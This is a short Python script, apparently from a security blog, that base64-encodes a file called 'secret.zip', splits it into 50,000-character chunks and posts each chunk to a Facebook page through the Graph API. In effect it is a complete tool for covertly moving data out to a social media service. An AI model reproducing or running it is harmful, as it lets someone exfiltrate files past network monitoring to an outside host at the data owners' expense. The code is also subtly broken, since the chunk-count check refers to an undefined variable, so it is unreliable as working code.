#!/usr/bin/env python

##########################################
### Python Script to post data to Facebook
### Author: Sid
### https://zone13.io
### Version 1.0
###########################################

import facebook, time, base64, textwrap

def main():
  cfg = {
    # Populate the page id and access token below
    "page_id"      : "",
    "access_token" : ""
    }

  api = get_api(cfg)

  # Read the zip file as binary data and encode using base-64
  msg = file_read_into_array()
  
  # Calculate number of posts to be made
  chunks = (len(msg) / float(50000)) 
  if isinstance(chunks, float) or (a == 0):
    chunks = int(chunks) + 1

  # Split the base-64 data into chunks of 50,000 characters 
  file_array = textwrap.wrap(msg, 50000)

  # Post the data to Facebook page
  for i in range(chunks):
    status = api.put_wall_post("Part####" + str(i) + "  " +  file_array[i])
    time.sleep(0.5)

# Function to read the zip file and base-64 encode
def file_read_into_array():
  with open("secret.zip", "rb") as f:
    a = f.read()
    encoded_data = base64.encodestring(a)
    return encoded_data

# Core function to post data to Facebook
def get_api(cfg):
  graph = facebook.GraphAPI(cfg['access_token'])
  resp = graph.get_object('me/accounts')
  page_access_token = None
  for page in resp['data']:
    if page['id'] == cfg['page_id']:
      page_access_token = page['access_token']
  graph = facebook.GraphAPI(page_access_token)
  return graph

if __name__ == "__main__":
  main()
